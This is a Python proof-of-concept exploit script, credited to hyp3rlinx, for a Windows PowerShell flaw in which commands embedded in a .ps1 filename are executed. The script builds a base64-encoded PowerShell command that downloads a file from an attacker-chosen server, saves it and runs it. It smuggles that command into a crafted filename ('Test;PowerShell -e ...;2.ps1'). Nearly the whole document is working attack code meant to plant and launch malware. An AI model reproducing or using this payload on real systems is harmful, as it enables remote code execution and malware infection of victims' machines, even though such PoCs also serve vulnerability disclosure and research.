from base64 import b64encode
import argparse,sys
#Windows PowerShell - Unsantized Filename Command Execution Vulnerability PoC
#Create ".ps1" files with Embedded commands to download, save and execute malware within a PowerShell Script Filename.
#Expects hostname/ip-addr of web-server housing the exploit.
#By hyp3rlinx
#Apparition Security
#====================


def parse_args():
    parser.add_argument("-i", "--ipaddress", help="Remote server to download and exec malware from.")
    parser.add_argument("-m", "--local_malware_name", help="Name for the Malware after downloading.")
    parser.add_argument("-r", "--remote_malware_name", help="Malwares name on remote server.")
    return parser.parse_args()

def main(args):
    PSEmbedFilenameMalwr=""
    if args.ipaddress:
        PSEmbedFilenameMalwr = "powershell iwr "+args.ipaddress+"/"+args.remote_malware_name+" -O %CD%\\"+args.local_malware_name+" ;sleep -s 2;start "+args.local_malware_name
    return b64encode(PSEmbedFilenameMalwr.encode('UTF-16LE'))

def create_file(payload):
    f=open("Test;PowerShell -e "+payload+";2.ps1", "w")
    f.write("Write-Output 'Have a nice day!'")
    f.close()

if __name__=="__main__":
    
    parser = argparse.ArgumentParser()
    PSCmds = main(parse_args())

    if len(sys.argv)==1:
        parser.print_help(sys.stderr)
        sys.exit(1)
        
    create_file(PSCmds)
    print "PowerShell - Unsantized Filename Command Execution File created!"
    print "By hyp3rlinx"